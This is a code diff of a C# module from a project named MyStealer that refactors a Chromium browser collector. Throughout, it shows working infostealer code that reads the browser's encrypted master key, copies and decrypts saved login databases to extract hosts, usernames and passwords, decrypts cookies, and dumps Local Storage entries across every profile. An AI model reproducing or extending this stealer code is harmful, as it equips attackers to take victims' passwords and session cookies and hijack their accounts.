@@ -1,76 +1,114 @@
 ﻿using MyStealer.Utils;
 using MyStealer.Utils.Chromium;
 using Newtonsoft.Json.Linq;
-using Serilog;
 using System;
 using System.Collections.Generic;
+using System.Collections.Immutable;
 using System.Data.SQLite;
 using System.IO;
 using System.Text;
 
 namespace MyStealer.Collectors.Browser
 {
-    internal class Chromium : IBrowserCollector
+    internal class Chromium : BrowserCollectorBase
     {
-        public virtual string ApplicationName => "Chromium";
+        public override string ModuleName => "Chromium";
 
-        private ILogger lazyLogger;
-        protected ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
+        public virtual bool HasProfiles => true;
 
         protected virtual string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Chromium", "User Data");
+
         protected virtual string[] CookieFilePathList => new string[] { "Cookies", Path.Combine("Network", "Cookies") };
 
         private ChromiumDecryptor decryptor;
-        private ISet<string> profileNameList;
+        private IImmutableSet<string> profileNames;
 
-        public bool IsAvailable() => File.Exists(Path.Combine(UserDataPath, "Local State"));
+        public override bool IsAvailable() => File.Exists(Path.Combine(UserDataPath, "Local State"));
 
-        public void Initialize()
+        public override void Initialize()
         {
             var localStateFile = Path.Combine(UserDataPath, "Local State");
             var localState = JObject.Parse(File.ReadAllText(localStateFile, encoding: Encoding.UTF8));
             decryptor = new ChromiumDecryptor(localState["os_crypt"]["encrypted_key"].Value<string>());
-            profileNameList = new HashSet<string>(localState["profile"]["profiles_order"].Values<string>());
-            Logger.Debug("Discovered profiles: {profiles}", string.Join(", ", profileNameList));
+
+            if (HasProfiles)
+            {
+                profileNames = localState["profile"]["profiles_order"].Values<string>().ToImmutableHashSet();
+                Logger.Debug("Discovered profiles: {profiles}", string.Join(", ", profileNames));
+            }
+            else
+            {
+                profileNames = ImmutableHashSet<string>.Empty;
+            }
         }
 
-        public virtual ISet<CredentialEntry> GetCredentials()
+        public override IImmutableSet<BrowserLogin> GetLogins()
         {
-            var set = new HashSet<CredentialEntry>();
-            foreach (var profileName in profileNameList)
+            var set = ImmutableHashSet.CreateBuilder<BrowserLogin>();
+            var count = 0;
+
+            if (HasProfiles)
             {
-                foreach (var cred in DecryptLoginData(profileName, Path.Combine(UserDataPath, profileName, "Login Data")))
-                    set.Add(cred);
+                foreach (var profileName in profileNames)
+                {
+                    count = DecryptLoginData(set, profileName, Path.Combine(UserDataPath, profileName, "Login Data"));
+                    Logger.Information("Read {count} logins from profile: {profile}", count, profileName);
+                }
+            }
+            else
+            {
+                count = DecryptLoginData(set, "", Path.Combine(UserDataPath, "Login Data"));
             }
 
-            return set;
+            Logger.Information("Read {count} logins in total.", count);
+            return set.ToImmutable();
         }
 
-        public virtual ISet<CookieEntry> GetCookies()
+        public override IImmutableSet<BrowserCookie> GetCookies()
         {
-            var set = new HashSet<CookieEntry>();
-            foreach (var profileName in profileNameList)
+            var set = ImmutableHashSet.CreateBuilder<BrowserCookie>();
+            var count = 0;
+
+            foreach (var cookiePath in CookieFilePathList)
             {
-                foreach (var cookiePath in CookieFilePathList)
+                if (HasProfiles)
                 {
-                    foreach (var cookie in DecryptCookies(profileName, Path.Combine(UserDataPath, profileName, cookiePath)))
-                        set.Add(cookie);
+                    foreach (var profileName in profileNames)
+                    {
+                        count = DecryptCookies(set, profileName, Path.Combine(UserDataPath, profileName, cookiePath));
+                        Logger.Information("Read {count} cookies from profile: {profile}", count, profileName);
+                    }
+                }
+                else
+                {
+                    count = DecryptCookies(set, "", Path.Combine(UserDataPath, cookiePath));
                 }
             }
 
-            return set;
+            Logger.Information("Read {count} cookies in total.", count);
+            return set.ToImmutable();
         }
 
-        public virtual ISet<LocalStorageEntry> GetLocalStorageEntries()
+        public override IImmutableSet<BrowserLocalStorage> GetLocalStorageEntries()
         {
-            var set = new HashSet<LocalStorageEntry>();
-            foreach (var profileName in profileNameList)
+            var set = ImmutableHashSet.CreateBuilder<BrowserLocalStorage>();
+            var count = 0;
+
+            if (HasProfiles)
             {
-                foreach (var entry in ReadLocalStorage(profileName, Path.Combine(UserDataPath, profileName, "Local Storage", "leveldb")))
-                    set.Add(entry);
+                foreach (var profileName in profileNames)
+                {
+                    count = ReadLocalStorage(set, profileName, Path.Combine(UserDataPath, profileName, "Local Storage", "leveldb"));
+                    Logger.Information("Read {count} Local Storage entries from profile: {profile}", count, profileName);
+                }
+            }
+            else
+            {
+                count = ReadLocalStorage(set, "", Path.Combine(UserDataPath, "Local Storage", "leveldb"));
             }
 
-            return set;
+            Logger.Information("Read {count} Local Storage entries in total.", count);
+            return set.ToImmutable();
         }
 
         private string GetEncryptedString(SQLiteDataReader reader, int i)
@@ -88,22 +126,21 @@ namespace MyStealer.Collectors.Browser
             }
         }
 
-        public ISet<CredentialEntry> DecryptLoginData(string profileName, string loginDataPath)
+        protected int DecryptLoginData(ISet<BrowserLogin> creds, string profileName, string loginDataPath)
         {
-            var creds = new HashSet<CredentialEntry>();
-
             if (!File.Exists(loginDataPath))
             {
-                Logger.Warning("({profile}) Login Data file does not exists", ApplicationName, profileName);
-                return creds;
+                Logger.Warning("Login Data file does not exists: {path}", loginDataPath);
+                return 0;
             }
 
-            Logger.Information("({profile}) Begin parsing Login Data file: {path}", ApplicationName, profileName, loginDataPath);
+            Logger.Information("Begin parsing Login Data file: {path}", loginDataPath);
 
             var copyName = Path.GetRandomFileName();
             File.Copy(loginDataPath, copyName, true); // prevent reading locked sql database
-            Logger.Debug("({profile}) Login Data file {path} copied to {randomName}", profileName, loginDataPath, copyName);
+            Logger.Debug("Login Data file {path} copied to {randomName}", loginDataPath, copyName);
 
+            var count = 0;
             try
             {
                 using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
@@ -121,10 +158,11 @@ namespace MyStealer.Collectors.Browser
 
                             if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                             {
-                                creds.Add(new CredentialEntry
+                                count++;
+                                creds.Add(new BrowserLogin
                                 {
-                                    ApplicationName = $"{ApplicationName}",
-                                    ApplicationProfileName = profileName,
+                                    BrowserName = $"{ModuleName}",
+                                    BrowserProfileName = profileName,
                                     Host = host,
                                     UserName = username,
                                     Password = password
@@ -136,34 +174,31 @@ namespace MyStealer.Collectors.Browser
             }
             catch (Exception e)
             {
-                Logger.Warning(e, "(Profile: {profile}) Error reading login entries",  profileName);
-                return creds;
+                Logger.Warning(e, "Error reading login entries from file: {path}", loginDataPath);
             }
             finally
             {
                 File.Delete(copyName);
-                Logger.Information("(Profile: {profile}) Read {n} login entries",  profileName, creds.Count);
             }
 
-            return creds;
+            return count;
         }
 
-        public ISet<CookieEntry> DecryptCookies(string profileName, string cookieFile)
+        protected int DecryptCookies(ISet<BrowserCookie> cookies, string profileName, string cookieFile)
         {
-            var cookies = new HashSet<CookieEntry>();
-
             if (!File.Exists(cookieFile))
             {
-                Logger.Warning("(Profile: {profile}) Cookies file does not exists: {path}", profileName, cookieFile);
-                return cookies;
+                Logger.Warning("Cookies file does not exists: {path}", profileName, cookieFile);
+                return 0;
             }
 
-            Logger.Information("(Profile: {profile}) Begin parsing Cookies file: {path}", profileName, cookieFile);
+            Logger.Information("Begin parsing Cookies file: {path}", profileName, cookieFile);
 
             var copyName = Path.GetRandomFileName();
             File.Copy(cookieFile, copyName, true); // prevent reading locked sql database
-            Logger.Debug("(Profile: {profile}) Login Data file {path} copied to {randomName}", profileName, cookieFile, copyName);
+            Logger.Debug("Login Data file {path} copied to {randomName}", profileName, cookieFile, copyName);
 
+            var count = 0;
             try
             {
                 using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
@@ -203,10 +238,11 @@ namespace MyStealer.Collectors.Browser
 
                             if (!string.IsNullOrEmpty(name))
                             {
-                                cookies.Add(new CookieEntry
+                                count++;
+                                cookies.Add(new BrowserCookie
                                 {
-                                    ApplicationName = ApplicationName,
-                                    ApplicationProfileName = profileName,
+                                    BrowserName = ModuleName,
+                                    BrowserProfileName = profileName,
                                     CreationDateTime = creationDate,
                                     LastAccessDateTime = accessDate,
                                     ExpireDateTime = expireDate,
@@ -226,44 +262,48 @@ namespace MyStealer.Collectors.Browser
             }
             catch (Exception e)
             {
-                Logger.Warning(e, "(Profile: {profile}) Error reading cookie entries", ApplicationName, profileName);
-                return cookies;
+                Logger.Warning(e, "Error reading cookie entries from file: {path}", cookieFile);
             }
             finally
             {
                 File.Delete(copyName);
-                Logger.Information("(Profile: {profile}) Read {n} cookie entries", ApplicationName, profileName, cookies.Count);
             }
 
-            return cookies;
+            return count;
         }
 
-        public ISet<LocalStorageEntry> ReadLocalStorage(string profileName, string levelDbPath)
+        protected int ReadLocalStorage(ISet<BrowserLocalStorage> set, string profileName, string levelDbPath)
         {
-            var set = new HashSet<LocalStorageEntry>();
-            var localStorageDb = new CclChromiumLocalStorage.LocalStoreDb(levelDbPath);
-
-            foreach (var record in localStorageDb.EnumerateRecords())
+            var count = 0;
+            try
             {
-                var batch = localStorageDb.FindBatch(record.Seq);
-                var timeStamp = DateTime.MinValue;
-                if (batch != null)
-                    timeStamp = batch.TimeStamp;
+                var localStorageDb = new CclChromiumLocalStorage.LocalStoreDb(levelDbPath);
 
-                set.Add(new LocalStorageEntry
+                foreach (var record in localStorageDb.EnumerateRecords())
                 {
-                    ApplicationName = ApplicationName,
-                    ApplicationProfileName = profileName,
-                    Host = record.StorageKey,
-                    Key = record.ScriptKey,
-                    Value = record.Value,
-                    AccessTimeStamp = timeStamp
-                });
+                    var batch = localStorageDb.FindBatch(record.Seq);
+                    var timeStamp = DateTime.MinValue;
+                    if (batch != null)
+                        timeStamp = batch.TimeStamp;
+
+                    count++;
+                    set.Add(new BrowserLocalStorage
+                    {
+                        BrowserName = ModuleName,
+                        BrowserProfileName = profileName,
+                        Host = record.StorageKey,
+                        Key = record.ScriptKey,
+                        Value = record.Value,
+                        AccessTimeStamp = timeStamp
+                    });
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error(ex, "Error reading Local Storage database: {path}", levelDbPath);
             }
 
-            return set;
+            return count;
         }
-
-        public void Dispose() { }
     }
 }
